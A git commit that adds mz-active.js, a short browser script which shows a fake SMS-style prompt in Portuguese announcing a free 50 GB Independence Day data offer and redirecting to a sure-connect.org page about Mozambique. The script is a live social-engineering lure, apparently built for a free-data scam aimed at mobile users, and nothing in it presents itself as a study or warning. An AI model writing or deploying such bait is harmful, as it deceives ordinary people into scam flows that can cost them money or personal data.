7891db748a37452df4e9ddc5b46dc4c1734d42bb
sureconnect001 <ukpe247@gmail.com>
2025-06-16 09:02:53 +0100

    Create mz-active.js

---
+++ mz-active.js
@@ -0,0 +1,5 @@
+var password = 'ATIVAR 50 GB'
+password=prompt('SMS: Parabéns, seu número de celular está qualificado para receber a oferta de 50 GB para a celebração do Dia da Independência. Pressione Ok para ativar agora. ','ATIVAR 50 GB');
+if (password != 'ATIVAR 50 GB') {
+location.href='https://sure-connect.org/mozambique.html';
+}
